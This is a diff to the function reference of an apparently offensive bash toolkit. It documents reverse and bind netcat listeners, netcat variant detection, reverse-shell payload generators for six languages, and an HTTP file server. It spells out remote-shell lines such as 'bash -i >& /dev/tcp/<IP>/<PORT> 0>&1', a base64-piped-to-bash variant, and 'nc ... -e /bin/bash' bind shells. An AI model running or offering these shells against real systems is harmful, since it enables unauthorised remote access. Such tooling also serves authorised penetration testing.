@@ -82,6 +82,35 @@ validate_ip "192.168.1.1"   # Returns 0 if valid IPv4, 1 if not
 validate_port "4444"         # Returns 0 if 1–65535, 1 if not
 ```
 
+### IP detection
+
+```bash
+get_local_ip
+# Returns the primary local IP via ip route, hostname -I, or ifconfig.
+# Falls back to 127.0.0.1 if nothing is found.
+
+prompt_local_ip
+# Calls get_local_ip, prints "Attacker IP [<detected>]: " to stderr,
+# reads user input, and echoes the chosen IP (or the detected value if
+# the user just pressed Enter).
+```
+
+### Session notes
+
+```bash
+add_session_note "$session_id"
+# Prompts for a free-text note and appends it with a UTC timestamp to
+# logs/sessions/${session_id}.notes
+
+view_session_notes "$session_id"
+# Prints all notes in logs/sessions/${session_id}.notes.
+# Reports "No notes" if the file doesn't exist.
+
+session_notes_menu
+# Interactive sub-menu: lists all sessions, lets the user pick one,
+# then offers Add note / View notes.
+```
+
 ### File helpers
 
 ```bash
@@ -127,29 +156,58 @@ Called automatically on source. Creates `logs/sessions/`, `certs/`, `payloads/`,
 
 Entry point — called by main menu option `1`. Loops until user selects Back.
 
+```
+1. Start Reverse Listener
+2. Start Bind Listener
+3. List Active Listeners
+4. Stop Listener
+5. Session Notes
+6. Back
+```
+
+### detect_nc()
+
+Probes which netcat variant is installed and returns a pipe-delimited string:
+
+```
+<binary>|<listen_flags>|<exec_supported>
+
+ncat        → "ncat|-l -n -v|yes"
+OpenBSD nc  → "nc|-l -n -v|no"
+classic nc  → "nc|-l -n -v -p|yes"
+netcat      → "netcat|-l -n -v -p|yes"
+none found  → "||no"
+```
+
+Used internally by `setup_reverse_listener()` and `setup_bind_listener()` to build the correct command for the installed variant.
+
 ### setup_reverse_listener()
 
-Prompts for port and rlwrap preference, creates a session, and starts an `nc`/`ncat` listener.
+Prompts for port and rlwrap preference, calls `detect_nc()`, creates a session, and starts the listener. After the session ends, offers to add a note.
 
 ```
 Prompts: listen IP (default 0.0.0.0), port (default 4444), use rlwrap [y/n]
 Creates: logs/sessions/<session_id>.json
-Starts:  nc -l -n -v -p <port>  (with optional rlwrap prefix)
+Starts:  <nc_cmd> <flags> <port>  (with optional rlwrap prefix)
+Shows:   connect-back command using auto-detected local IP
+Post:    "Add a note to this session? [y/n]"
 ```
 
 ### setup_bind_listener()
 
-Starts a bind shell listener (`nc -e /bin/bash`) in the background.
+Starts a bind shell listener in the background. Handles exec-flag differences per variant.
 
 ```
 Prompts: port (default 4444), use rlwrap [y/n]
-Starts:  nc -l -n -v -p <port> -e /bin/bash &
+ncat:       ncat -l -n -v <port> --exec /bin/bash &
+classic nc: nc  -l -n -v -p <port> -e /bin/bash &
+OpenBSD nc: mkfifo workaround (no -e support)
 Outputs: PID of background listener
 ```
 
 ### list_listeners()
 
-Lists active `nc`/`ncat` processes via `ps`.
+Lists active `nc`/`ncat`/`netcat` processes via `ps`.
 
 ### stop_listener()
 
@@ -163,28 +221,69 @@ Prompts for a PID and sends SIGKILL.
 
 Entry point — called by main menu option `2`.
 
+```
+1.  Bash Reverse Shell
+2.  PowerShell Reverse Shell
+3.  Python Reverse Shell
+4.  Perl Reverse Shell
+5.  Ruby Reverse Shell
+6.  PHP Reverse Shell
+7.  One-Liner Templates
+8.  View Generated Payloads
+9.  Batch Generate (All Types)
+10. Back
+```
+
 ### generate_bash_payload()
 
-Prompts for attacker IP/port, optional Base64 encoding and obfuscation. Outputs:
+Calls `prompt_local_ip()` for the attacker IP, prompts for port and optional Base64 encoding. Outputs:
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+# or with Base64:
+echo <b64> | base64 -d | bash
 ```
 
 ### generate_powershell_payload()
 
-Prompts for attacker IP/port, optional Base64 encoding. Outputs a TCP PowerShell reverse shell one-liner.
+Calls `prompt_local_ip()`, prompts for port and optional Base64 encoding. Outputs a full TCP PowerShell reverse shell one-liner, optionally encoded as `-EncodedCommand`.
 
 ### generate_python_payload()
 
-Prompts for IP/port and Python version (2 or 3). Outputs a `socket`+`pty.spawn` one-liner.
+Calls `prompt_local_ip()`, prompts for port and Python version (2 or 3). Outputs a `socket`+`pty.spawn` one-liner.
+
+### generate_perl_payload()
+
+Calls `prompt_local_ip()`, prompts for port. Outputs:
+```bash
+perl -e 'use Socket;...'
+```
+
+### generate_ruby_payload()
+
+Calls `prompt_local_ip()`, prompts for port. Outputs:
+```bash
+ruby -rsocket -e'f=TCPSocket.open(...)'
+```
+
+### generate_php_payload()
+
+Calls `prompt_local_ip()`, prompts for port and style (proc_open or fsockopen). Outputs a PHP one-liner.
 
 ### show_templates()
 
-Displays static one-liner reference table (Bash TCP, Bash UDP, Python PTY).
+Displays a static reference table of one-liners for Bash TCP, Bash UDP, Python PTY, Perl, Ruby, and PHP.
 
 ### batch_generate()
 
-Prompts for one IP/port pair and writes all three payload types to `PAYLOADS_DIR` at once.
+Calls `prompt_local_ip()`, prompts for a port, then writes all six payload types to `PAYLOADS_DIR` at once:
+```
+batch_<timestamp>_bash.sh
+batch_<timestamp>_powershell.ps1
+batch_<timestamp>_python.py
+batch_<timestamp>_perl.pl
+batch_<timestamp>_ruby.rb
+batch_<timestamp>_php.php
+```
 
 ### view_payloads()
 
@@ -245,6 +344,15 @@ Returns 1 with an error message if `socat` or `openssl` is not installed.
 
 Entry point — called by main menu option `4`.
 
+```
+1. Upload File (SCP)
+2. Download File (SCP)
+3. Serve Files (HTTP Server)
+4. Verify Checksum
+5. View History
+6. Back
+```
+
 ### upload_file()
 
 Prompts for local file path, remote user, remote host, remote destination path. Runs:
@@ -259,6 +367,14 @@ Prompts for remote user, remote host, remote file path, local save path. Runs:
 scp <user>@<host>:<file> <local_path>
 ```
 
+### serve_http()
+
+Requires `python3`. Prompts for a directory to serve and a port (default `8000`). Calls `get_local_ip()` to display ready-to-use `wget`/`curl` commands, then starts:
+```bash
+python3 -m http.server <port>
+```
+The server runs in the foreground; press Ctrl+C to stop it.
+
 ### verify_checksum()
 
 Prompts for a file path. Outputs MD5 and SHA256:
@@ -271,7 +387,7 @@ Uses `md5sum`/`md5` and `sha256sum`/`shasum -a 256` with fallbacks.
 
 ### view_transfer_history()
 
-Greps `LOG_FILE` for transfer-related entries and shows the last 20 lines.
+Greps `LOG_FILE` for `transfer`, `upload`, `download`, `scp`, and `http server` entries and shows the last 20 lines.
 
 ---
 
